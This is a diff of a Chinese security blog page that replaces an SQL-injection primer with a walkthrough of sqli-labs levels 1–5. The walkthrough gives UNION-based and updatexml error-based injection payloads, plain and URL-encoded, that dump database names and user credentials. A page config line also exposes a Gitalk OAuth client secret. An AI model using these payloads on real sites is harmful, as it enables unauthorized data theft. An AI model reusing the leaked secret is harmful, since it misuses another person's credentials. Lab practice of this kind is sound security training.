@@ -19,25 +19,25 @@
   <meta name="author" content="pasiphae">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、序言我们通过一个实验来浅析SQL注入的原理，实验基于我编写的一个简单的书店系统，其已被我上传到了GitHubhttps:&#x2F;&#x2F;github.com&#x2F;pasiphae321&#x2F;BookstoreSystem预览链接 二、切换模式在search.php中存在两种模式，一种使用PDO的prepare、bindParam方法进行防范SQL注入(下图圈一)，另一种存在SQL注入漏洞(下图圈二)我们切换到模式">
+    <meta name="description" content="关于sqli-labs靶场的搭建，可以参阅我的另一篇文章 ubuntu下sqli-labs靶场搭建 第一关 提示我们带参数ID，但试了1、2、3都不行，发现是小写的id，这提示有点抽象  判断数据库类型#注释仅适用于mysql和sqlite，构造1;#123并进行URL编码  最终的payload为?id&#x3D;1%3B%23123  上图成功输出用户名和密码说明#注释能用 &nbsp; 接着判断是my">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入原理浅析">
-<meta property="og:url" content="https://www.pasiphae.top/2022/11/02/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/index.html">
+<meta property="og:title" content="sqli-labs过关">
+<meta property="og:url" content="https://www.pasiphae.top/2022/11/20/sqli-labs%E8%BF%87%E5%85%B3/index.html">
 <meta property="og:site_name" content="pasiphae&#39;s blog">
-<meta property="og:description" content="一、序言我们通过一个实验来浅析SQL注入的原理，实验基于我编写的一个简单的书店系统，其已被我上传到了GitHubhttps:&#x2F;&#x2F;github.com&#x2F;pasiphae321&#x2F;BookstoreSystem预览链接 二、切换模式在search.php中存在两种模式，一种使用PDO的prepare、bindParam方法进行防范SQL注入(下图圈一)，另一种存在SQL注入漏洞(下图圈二)我们切换到模式">
+<meta property="og:description" content="关于sqli-labs靶场的搭建，可以参阅我的另一篇文章 ubuntu下sqli-labs靶场搭建 第一关 提示我们带参数ID，但试了1、2、3都不行，发现是小写的id，这提示有点抽象  判断数据库类型#注释仅适用于mysql和sqlite，构造1;#123并进行URL编码  最终的payload为?id&#x3D;1%3B%23123  上图成功输出用户名和密码说明#注释能用 &nbsp; 接着判断是my">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://callisto.oss-cn-chengdu.aliyuncs.com/images/background/earth2.jpg">
-<meta property="article:published_time" content="2022-11-02T07:23:36.000Z">
-<meta property="article:modified_time" content="2024-10-21T14:15:48.668Z">
+<meta property="og:image" content="https://callisto.oss-cn-chengdu.aliyuncs.com/images/background/jupiter2.jpg">
+<meta property="article:published_time" content="2022-11-20T03:19:07.000Z">
+<meta property="article:modified_time" content="2024-10-21T15:33:51.565Z">
 <meta property="article:author" content="pasiphae">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://callisto.oss-cn-chengdu.aliyuncs.com/images/background/earth2.jpg">
+<meta name="twitter:image" content="https://callisto.oss-cn-chengdu.aliyuncs.com/images/background/jupiter2.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>SQL注入原理浅析 - pasiphae&#39;s blog</title>
+  <title>sqli-labs过关 - pasiphae&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SQL注入原理浅析"></span>
+            <span id="subtitle" data-typed-text="sqli-labs过关"></span>
           
         </div>
 
@@ -214,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-02 15:23" pubdate>
-          2022年11月2日 下午
+        <time datetime="2022-11-20 11:19" pubdate>
+          2022年11月20日 上午
         </time>
       </span>
     
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          898 字
+          1.4k 字
         
       </span>
     
@@ -287,43 +287,102 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SQL注入原理浅析</h1>
+            <h1 id="seo-header">sqli-labs过关</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="一、序言"><a href="#一、序言" class="headerlink" title="一、序言"></a>一、序言</h2><p>我们通过一个实验来浅析SQL注入的原理，实验基于我编写的一个简单的书店系统，其已被我上传到了GitHub<br><a target="_blank" rel="noopener" href="https://github.com/pasiphae321/BookstoreSystem">https://github.com/pasiphae321/BookstoreSystem</a><br>预览链接</p>
-<h2 id="二、切换模式"><a href="#二、切换模式" class="headerlink" title="二、切换模式"></a>二、切换模式</h2><p>在search.php中存在两种模式，一种使用PDO的prepare、bindParam方法进行防范SQL注入(下图圈一)，另一种存在SQL注入漏洞(下图圈二)<br>我们切换到模式二<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/1.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<h2 id="三、正式实验"><a href="#三、正式实验" class="headerlink" title="三、正式实验"></a>三、正式实验</h2><p>1.登录系统<br>以任何一个用户登录系统，访问书籍搜索页面<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/2.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>2.进行正常搜索<br>由下面两图可以看到，正常搜索无论是否存在对应书籍都会有回显<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/3.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/4.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>3.探测是否存在SQL注入漏洞<br>BookName这种一看在mysql中的字段类型就是字符串，那么其在后端对应的SQL语句应该就是</p>
-<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> xxx <span class="hljs-keyword">from</span> xxx <span class="hljs-keyword">where</span> BookName = <span class="hljs-string">&#x27;后端所用语言的某个变量名&#x27;</span>;<br></code></pre></td></tr></table></figure>
-
-<p>通过输入<code>1&#39;</code>，将SQL语句中的第一个<code>&#39;</code>与<code>1</code>后面的<code>&#39;</code>构成一对，那么其后的<code>&#39;;</code>就会造成SQL的语法错误，执行这个SQL语句MySQL就会报错，那么后端在得到报错后可能就不会设置回显或者设置不同的回显</p>
-<p>由下图可以看到，因为MySQL的报错，后端返回了不同的回显，说明存在SQL注入漏洞<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/5.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>4.探测数据库类型<br>常见数据库有MySQL、PostgreSQL、SQLServer、oracle，只有MySQL有##注释</p>
-<p>尝试输入<code>&#39; ##</code>看数据库是否报错，由下图可以看到并未出现查询失败的回显，说明数据库并未报错，那么数据库就是MySQL<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/6.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>关于其它三个数据库的区分，可以查阅网络上的资料</p>
-<p>5.探测select的字段数量<br>虽然前端的表格只有两个字段，但是后端的SQL语句有可能select了不止两个字段，那么我们通过union select进行探测</p>
-<p>输入<code>为什么&#39; union select 1,2;##</code>，可以看到回显有1和2，说明后端的SQL语句select了两个字段<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/7.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>输入<code>为什么&#39; union select 1,2,3;##</code>，可以看到MySQL报错了，说明union前后的两个select的字段数量不一致，验证了后端的SQL语句确实select了两个字段<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/8.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>6.获取MySQL中的所有数据<br>MySQL中有一个名为information_schema的库，库中有个名为COLUMNS的表，表中存在三个字段TABLE_SCHEMA、TABLE_NAME、COLUMN_NAME，分别表示库名、表名、列名，可通过此表查询整个MySQL的信息<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/9.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>例如，查询整个MySQL的所有数据库名</p>
-<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">为什么&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> TABLE_SCHEMA, <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> TABLE_SCHEMA;##<br></code></pre></td></tr></table></figure>
-<p>可以看到查到了所有数据库名<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/10.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>查询BookstoreSystem库的所有表名</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">为什么&#x27; union <span class="hljs-keyword">select</span> TABLE_NAME, <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_SCHEMA = <span class="hljs-string">&#x27;BookstoreSystem&#x27;</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> TABLE_NAME;##<br></code></pre></td></tr></table></figure>
-<p>可以看到，查出了所有的表名<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/11.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>查询users表的所有字段名</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">为什么&#x27; union <span class="hljs-keyword">select</span> COLUMN_NAME, <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_SCHEMA = <span class="hljs-string">&#x27;BookstoreSystem&#x27;</span> <span class="hljs-keyword">and</span> TABLE_NAME = <span class="hljs-string">&#x27;users&#x27;</span>;##<br></code></pre></td></tr></table></figure>
-<p>可以看到，查出了所有字段名<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/12.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>查询username和password字段的所有值</p>
-<figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">为什么&#x27; <span class="hljs-keyword">union</span> select username, password <span class="hljs-keyword">from</span> BookstoreSystem.users;<span class="hljs-comment">##</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/13.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
-<p>通过如上方式，可获取整个数据库的数据</p>
-<h2 id="四、防范SQL注入的方法"><a href="#四、防范SQL注入的方法" class="headerlink" title="四、防范SQL注入的方法"></a>四、防范SQL注入的方法</h2><h3 id="1-参数化查询-parameterized-query"><a href="#1-参数化查询-parameterized-query" class="headerlink" title="1.参数化查询(parameterized query)"></a>1.参数化查询(parameterized query)</h3><p>通过将SQL的代码和数据相分离，例如使用PHP的PDO的prepare方法和bindParam方法，本实验使用的书店系统就采用的此方式</p>
-<h3 id="2-使用ORM框架"><a href="#2-使用ORM框架" class="headerlink" title="2.使用ORM框架"></a>2.使用ORM框架</h3><p>ORM即Obejct Relationship Mapping对象关系映射，具体原理可查阅网络上的资料</p>
-<h3 id="3-在后端进行关键字过滤"><a href="#3-在后端进行关键字过滤" class="headerlink" title="3.在后端进行关键字过滤"></a>3.在后端进行关键字过滤</h3><p>后端过滤掉能够引起SQL注入的关键字如<code>&#39;/##/;/--/union/select</code>等等，但这种方式会在一定程度上影响正常搜索</p>
+                <p>关于sqli-labs靶场的搭建，可以参阅我的另一篇文章 <a href="https://www.pasiphae.top/2022/11/09/ubuntu%E4%B8%8Bsqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">ubuntu下sqli-labs靶场搭建</a></p>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/1.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>提示我们带参数ID，但试了1、2、3都不行，发现是小写的id，这提示有点抽象</p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/2.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p><code>#注释</code>仅适用于mysql和sqlite，构造<code>1;#123</code>并进行URL编码</p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/3.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>最终的payload为<code>?id=1%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/4.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>上图成功输出用户名和密码说明<code>#注释</code>能用</p>
+<p>&nbsp;</p>
+<p>接着判断是mysql还是sqlite</p>
+<p>mysql中字符串拼接可用<code>&#39;ab&#39; + &#39;cd&#39; = &#39;abcd&#39;</code>，但sqlite中不能</p>
+<p>构造<code>1 and &#39;ab&#39; + &#39;cd&#39; = &#39;abcd&#39;;#123</code>并进行URL编码</p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/5.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>最终payload为<code>?id=1%20and%20%27ab%27%20%2B%20%27cd%27%20%3D%20%27abcd%27%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/6.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>数据库居然报错了，当然可以直接从报错信息得出数据库管理系统为mysql，但是一般服务器都不会将报错信息回送给客户端的，只会显示诸如<code>搜索结果为空</code>或直接置空之类的</p>
+<p>&nbsp;</p>
+<p>它这里的报错信息让我百思不得其解，直接查看源码，发现它居然在SQL语句中给id字段加单引号，但在mysql中其数据类型为int。虽然mysql会自动进行数据类型转换，但这个代码编写得确实很有瑕疵</p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/7.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/8.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>&nbsp;</p>
+<p>那我们将payload修改为<code>1&#39; &#39;ab&#39; + &#39;cd&#39; = &#39;abcd&#39;;#123</code>，并进行URL编码</p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/9.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>最终的payload为<code>1%27%20and%20%27ab%27%20%2B%20%27cd%27%20%3D%20%27abcd%27%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/10.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>成功显示出用户名密码，说明数据库为mysql</p>
+<h3 id="字段数量查询"><a href="#字段数量查询" class="headerlink" title="字段数量查询"></a>字段数量查询</h3><p>查询当前使用的表有多少个字段</p>
+<p>是两个吗？<code>-2&#39; union select 1,2;#123</code></p>
+<p>URL编码<code>%2D2%27%20union%20select%201%2C2%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/11.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>不是两个</p>
+<p>&nbsp;</p>
+<p>是三个吗？<code>-2&#39; union select 1,2,3;#123</code></p>
+<p>URL编码<code>%2D2%27%20union%20select%201%2C2%2C3%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/12.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>是三个，且显示在浏览器的是第二个和第三个字段</p>
+<h3 id="爆出所有库名"><a href="#爆出所有库名" class="headerlink" title="爆出所有库名"></a>爆出所有库名</h3><p><code>-2&#39; union select 1, GROUP_CONCAT(distinct TABLE_SCHEMA), 3 from information_schema.COLUMNS;#123</code></p>
+<p>URL编码<code>%2D2%27%20union%20select%201%2C%20GROUP%5FCONCAT%28distinct%20TABLE%5FSCHEMA%29%2C%203%20from%20information%5Fschema%2ECOLUMNS%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/13.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<h3 id="爆出所有表名"><a href="#爆出所有表名" class="headerlink" title="爆出所有表名"></a>爆出所有表名</h3><p>爆出security库的所有表名</p>
+<p><code>-2&#39; union select 1, GROUP_CONCAT(distinct TABLE_NAME), 3 from information_schema.COLUMNS where TABLE_SCHEMA = &#39;security&#39;;#123</code></p>
+<p>URL编码<code>%2D2%27%20union%20select%201%2C%20GROUP%5FCONCAT%28TABLE%5FNAME%29%2C%203%20from%20information%5Fschema%2ECOLUMNS%20where%20TABLE%5FSCHEMA%20%3D%20%27security%27%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/14.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<h3 id="爆出所有字段名"><a href="#爆出所有字段名" class="headerlink" title="爆出所有字段名"></a>爆出所有字段名</h3><p>爆出users表中的所有字段名</p>
+<p><code>-2&#39; union select 1, GROUP_CONCAT(distinct COLUMN_NAME), 3 from information_schema.COLUMNS where TABLE_SCHEMA = &#39;security&#39; and TABLE_NAME = &#39;users&#39;;#123</code></p>
+<p>URL编码<code>%2D2%27%20union%20select%201%2C%20GROUP%5FCONCAT%28distinct%20COLUMN%5FNAME%29%2C%203%20from%20information%5Fschema%2ECOLUMNS%20where%20TABLE%5FSCHEMA%20%3D%20%27security%27%20and%20TABLE%5FNAME%20%3D%20%27users%27%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/15.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<h3 id="爆出所有用户名密码"><a href="#爆出所有用户名密码" class="headerlink" title="爆出所有用户名密码"></a>爆出所有用户名密码</h3><p>爆出users表中的所有用户名密码</p>
+<p><code>-2&#39; union select 1, GROUP_CONCAT(username), GROUP_CONCAT(password) from security.users;#123</code></p>
+<p>URL编码<code>%2D2%27%20union%20select%201%2C%20GROUP%5FCONCAT%28username%29%2C%20GROUP%5FCONCAT%28password%29%20from%20security%2Eusers%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/16.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>以这种方式，整个数据库的所有数据都能被导出</p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>输入1没问题，输入<code>1%27</code>报错</p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/17.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>说明这次后端的SQL语句没有加单引号</p>
+<p>其它步骤跟第一关一致，只是要去掉-2后面的单引号</p>
+<p><code>-2 union select 1, GROUP_CONCAT(username), GROUP_CONCAT(password) from security.users;#123</code></p>
+<p>URL编码<code>%2D2%20union%20select%201%2C%20GROUP%5FCONCAT%28username%29%2C%20GROUP%5FCONCAT%28password%29%20from%20security%2Eusers%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/18.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>输入<code>1%27</code>报错如下</p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/19.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>说明后端的SQL语句是这样的<code>... id = (&#39;$id&#39;) ...</code></p>
+<p>那只用将<code>-2&#39;</code>替换为<code>-2&#39;)</code>，其它步骤跟第一关一致</p>
+<p><code>-2&#39;) union select 1, GROUP_CONCAT(username), GROUP_CONCAT(password) from security.users;#123</code></p>
+<p>URL编码<code>%2D2%27%29%20union%20select%201%2C%20GROUP%5FCONCAT%28username%29%2C%20GROUP%5FCONCAT%28password%29%20from%20security%2Eusers%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/20.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>输入<code>1%22</code>报错如下</p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/21.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>说明后端的SQL语句是<code>... id = (&quot;$id&quot;) limit 0,1</code></p>
+<p>那只用将<code>-2&#39;</code>替换为<code>-2&quot;)</code>，其它步骤跟第一关一致</p>
+<p><code>-2&quot;) union select 1, GROUP_CONCAT(username), GROUP_CONCAT(password) from security.users;#123</code></p>
+<p>URL编码<code>%2D2%22%29%20union%20select%201%2C%20GROUP%5FCONCAT%28username%29%2C%20GROUP%5FCONCAT%28password%29%20from%20security%2Eusers%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/22.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>输入<code>1</code>不报错，但只显示<code>you are in</code></p>
+<p>输入<code>1%27</code>报错，得出后端的SQL语句为<code>... id = &#39;$id&#39; limit 0,1</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/23.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>但因为成功查询只会给出固定的<code>you are in</code>，所以只能在报错信息上做文章</p>
+<p>使用updatexml函数，构造<code>-2&#39; union select 1, updatexml(&#39;&lt;a&gt;&lt;b&gt;123&lt;/a&gt;&lt;/b&gt;&#39;, CONCAT(&#39;!&#39;, (select GROUP_CONCAT(distinct TABLE_SCHEMA) from information_schema.COLUMNS), &#39;!&#39;), &#39;456&#39;), 3;#123</code></p>
+<p>URL编码<code>%2D2%27%20union%20select%201%2C%20updatexml%28%27%3Ca%3E%3Cb%3E123%3C%2Fa%3E%3C%2Fb%3E%27%2C%20CONCAT%28%27%21%27%2C%20%28select%20GROUP%5FCONCAT%28distinct%20TABLE%5FSCHEMA%29%20from%20information%5Fschema%2ECOLUMNS%29%2C%20%27%21%27%29%2C%20%27456%27%29%2C%203%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/24.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>因为此错误的细节只显示32字节，于是数据库名显示不全，就要用到<code>not in (xxx)</code></p>
+<p><code>-2&#39; union select 1, updatexml(&#39;&lt;a&gt;&lt;b&gt;123&lt;/a&gt;&lt;/b&gt;&#39;, CONCAT(&#39;!&#39;, (select GROUP_CONCAT(distinct TABLE_SCHEMA) from information_schema.COLUMNS where TABLE_SCHEMA not in (&#39;challenges&#39;, &#39;information_schema&#39;)), &#39;!&#39;), &#39;456&#39;), 3;#123</code></p>
+<p>URL编码<code>%2D2%27%20union%20select%201%2C%20updatexml%28%27%3Ca%3E%3Cb%3E123%3C%2Fa%3E%3C%2Fb%3E%27%2C%20CONCAT%28%27%21%27%2C%20%28select%20GROUP%5FCONCAT%28distinct%20TABLE%5FSCHEMA%29%20from%20information%5Fschema%2ECOLUMNS%20where%20TABLE%5FSCHEMA%20not%20in%20%28%27challenges%27%2C%20%27information%5Fschema%27%29%29%2C%20%27%21%27%29%2C%20%27456%27%29%2C%203%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/25.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>此处省略中间过程</p>
+<p><code>-2&#39; union select 1, updatexml(&#39;&lt;a&gt;&lt;b&gt;123&lt;/a&gt;&lt;/b&gt;&#39;, CONCAT(&#39;!&#39;, (select CONCAT(username, password) from security.users where id = 1), &#39;!&#39;), &#39;456&#39;), 3;#123</code></p>
+<p>URL编码<code>%2D2%27%20union%20select%201%2C%20updatexml%28%27%3Ca%3E%3Cb%3E123%3C%2Fa%3E%3C%2Fb%3E%27%2C%20CONCAT%28%27%21%27%2C%20%28select%20CONCAT%28username%2C%20password%29%20from%20security%2Eusers%20where%20id%20%3D%201%29%2C%20%27%21%27%29%2C%20%27456%27%29%2C%203%3B%23123</code></p>
+<p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/26.png" srcset="/img/loading.gif" lazyload alt="这里有一个图片"></p>
+<p>得到id为1的用户名密码</p>
+<p>借助这种方式，可爆出数据库的所有数据</p>
 
                 
               </div>
@@ -341,8 +400,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SQL注入原理浅析</div>
-      <div>https://www.pasiphae.top/2022/11/02/SQL注入原理浅析/</div>
+      <div>sqli-labs过关</div>
+      <div>https://www.pasiphae.top/2022/11/20/sqli-labs过关/</div>
     </div>
     <div class="license-meta">
       
@@ -354,7 +413,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年11月2日</div>
+          <div>2022年11月20日</div>
         </div>
       
       
@@ -386,9 +445,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/09/ubuntu%E4%B8%8Bsqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/" title="ubuntu下sqli-labs靶场搭建">
+                      <a href="/2022/12/12/CSRF%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/" title="CSRF原理详解">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ubuntu下sqli-labs靶场搭建</span>
+                        <span class="hidden-mobile">CSRF原理详解</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -396,8 +455,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/25/OpenWRt%E9%98%B2%E7%81%AB%E5%A2%99%E8%AF%A6%E8%A7%A3/" title="OpenWRt防火墙详解">
-                        <span class="hidden-mobile">OpenWRt防火墙详解</span>
+                      <a href="/2022/11/09/ubuntu%E4%B8%8Bsqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/" title="ubuntu下sqli-labs靶场搭建">
+                        <span class="hidden-mobile">ubuntu下sqli-labs靶场搭建</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -420,7 +479,7 @@
         var options = Object.assign(
           {"clientID":"Ov23liLrR5TiUqomlpen","clientSecret":"8f84493c225143d48a06471c47289a42d61008ae","repo":"pasiphae321.github.io","owner":"pasiphae321","admin":["pasiphae321"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
           {
-            id: '9f5a576e3c59bdd9d83580c12694a776'
+            id: 'c38504a3b0b2f3b531c096063e3c85fa'
           }
         )
         var gitalk = new Gitalk(options);
